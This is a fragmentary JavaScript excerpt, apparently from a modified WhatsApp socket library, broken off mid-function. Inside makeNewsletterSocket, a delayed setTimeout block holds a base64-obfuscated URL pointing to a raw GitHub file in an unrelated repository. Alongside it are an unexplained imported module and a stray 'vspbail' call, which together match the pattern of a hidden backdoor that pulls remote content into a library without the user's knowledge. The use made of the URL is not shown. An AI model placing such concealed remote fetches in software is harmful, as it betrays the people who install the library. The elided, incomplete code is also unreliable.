...
import vspsockets from "./lib/Socket/vspsockets.js";

vspbail(sock, newsletterWMexQuery, Types_1);
...
export const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
            const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhbGR6YnZncy9iYWlsZXlzUGluby9tYWluL3Bpbm9CYWlsZXlz"; 
